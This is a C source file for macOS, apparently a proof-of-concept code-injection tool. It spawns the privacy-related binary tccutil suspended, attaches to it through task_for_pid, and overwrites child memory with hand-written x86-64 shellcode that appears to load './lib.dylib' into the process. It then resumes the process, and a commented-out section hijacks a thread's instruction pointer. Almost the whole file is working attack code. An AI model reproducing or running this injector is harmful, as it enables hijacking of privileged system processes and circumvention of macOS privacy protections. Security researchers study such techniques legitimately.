#include <stdio.h>
#include <stdio.h>
#include <unistd.h>
#include <ptrauth.h>
#include <signal.h>
#include <spawn.h>

#include <sys/types.h>
#include <sys/wait.h>

#import <dlfcn.h>
#import <mach-o/dyld.h>
#import <mach-o/nlist.h>

#include <mach/mach.h>
#include <mach/mach_types.h>
#include <mach/mach_vm.h>

void
dump(void *buf, size_t len)
{
        uint8_t *ptr;
        ptr = buf;
        for (size_t i = 0; i < len; ++i) {
                printf("%02x", ptr[i]);
                if ((i + 1) % 8 == 0) {
                        printf("\n");
                } else if ((i + 1) % 4 == 0) {
                        printf(" ");
                }
        }
        printf("\n");
}

int
main(int argc, char *argv[])
{
        posix_spawnattr_t attr;
        if (posix_spawnattr_init(&attr)) {
                perror("attr_init");
                goto _EXIT;
        }

        if (posix_spawnattr_setflags(&attr, POSIX_SPAWN_START_SUSPENDED)) {
                perror("setflags");
                goto _EXIT;
        }

        pid_t pid;
        //if (posix_spawn(&pid, "./SecurityPrivacyExtension", NULL, &attr, NULL, NULL)) {
        if (posix_spawn(&pid, "./tccutil", NULL, &attr, NULL, NULL)) {
                perror("spawn");
                goto _EXIT;
        }
        printf("parent pid: %d, child: %d\n", getpid(), pid);

        mach_port_t port_self;
        port_self = mach_task_self();

        kern_return_t res;

        task_t task;
        res = task_for_pid(port_self, pid, &task);
        if (res != KERN_SUCCESS) {
                printf("failed to attach, res: %u, str: %s\n", res,  mach_error_string(res));
                goto _EXIT;
        }
        printf("attached to child\n");

        static char shl[] = {
0x55,
0x48, 0x89, 0xe5,
0x48, 0x89, 0xd8,
0x53,
0x48, 0x8b, 0x00,
0x48, 0x8b, 0x40, 0x70,
0x5b,
0x48, 0x89, 0xdf,
0x48, 0x8d, 0x35, 0x08, 0x00, 0x00, 0x00,
0xba, 0x02, 0x00, 0x00, 0x00,
0x5d,
0xff, 0xe0,

0x2e,
0x2f,
0x6c,
0x69, 0x62, 0x2e, 0x64, 0x79, 0x6c, 0x69,
0x62,
0x00,
        };

        dump(shl, sizeof (shl));

        mach_vm_address_t addr;
        printf("reg> ");
        scanf("%llx", &addr);
        printf("reg: %llx\n", addr);

        res = mach_vm_protect(task, addr, 0x4000, 0, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
        if (res != KERN_SUCCESS) {
                printf("failed to change remote protections, res: %u, str: %s\n", res, mach_error_string(res));
                goto _EXIT;
        }
        printf("changed page protections\n");

        /*
        res = mach_vm_allocate(task, &addr, sizeof (shl), VM_FLAGS_ANYWHERE);
        if (res != KERN_SUCCESS) {
                printf("failed to allocate a new page, res: %u, str: %s\n", res, mach_error_string(res));
                goto _EXIT;
        }
        printf("allocated new page, addr: %p\n", addr);
        */

        printf("ent> ");
        scanf("%llx", &addr);
        printf("ent: %llx\n", addr);

        res = mach_vm_write(task, addr, (vm_offset_t)shl, sizeof (shl));
        if (res != KERN_SUCCESS) {
                printf("failed to write the shellcode, res: %u, str: %s\n", res, mach_error_string(res));
                goto _EXIT;
        }
        printf("wrote the shellcode\n");

        res = mach_vm_protect(task, addr, sizeof (shl), 0, VM_PROT_READ | VM_PROT_EXECUTE);
        if (res != KERN_SUCCESS) {
                printf("failed to change remote protections, res: %u, str: %s\n", res, mach_error_string(res));
                goto _EXIT;
        }
        printf("changed page protections\n");

/*
        thread_act_port_array_t thds;
        mach_msg_type_number_t  tcnt;

        tcnt = 0;
        res = task_threads(task, &thds, &tcnt);
        if (res != KERN_SUCCESS) {
                printf("failed to get remote threads, res: %u\n", res);
                goto _EXIT;
        }
        printf("got %u number of threads\n", tcnt);

        size_t tidx;
        tidx = 0;

        if (tidx >= tcnt) {
                printf("the selected thread index is invalid\n");
                goto _EXIT;
        }

        mach_msg_type_number_t tsc;
        tsc = x86_THREAD_STATE64_COUNT;

        x86_thread_state64_t tst;
        res = thread_get_state(thds[tidx], x86_THREAD_STATE64, (thread_state_t)&tst, &tsc);
        if (res != KERN_SUCCESS) {
                printf("failed to get thread state, res: %u, str:%s\n", res, mach_error_string(res));
                goto _EXIT;
        }

        printf("old RIP: %016llx\n", tst.__rip);
        tst.__rip = addr;
        printf("new RIP: %016llx\n", tst.__rip);

        res = thread_set_state(thds[tidx], x86_THREAD_STATE64, (thread_state_t)&tst, tsc);
        if (res != KERN_SUCCESS) {
                printf("failed to set the thread state, res: %u, str:%s\n", res, mach_error_string(res));
                goto _EXIT;
        }
        printf("set the new instruction pointer\n");
*/
        getchar();
        if (kill(pid, SIGCONT) == -1) {
                perror("kill cont");
                goto _EXIT;
        }
        printf("resumed the child %d\n", pid);

        int status;
        if (waitpid(pid, &status, 0) == -1) {
                perror("waitpid failed");
                goto _EXIT;
        }
        printf("wait finished %d\n", WIFEXITED(status));

_EXIT:
        return 0;
}
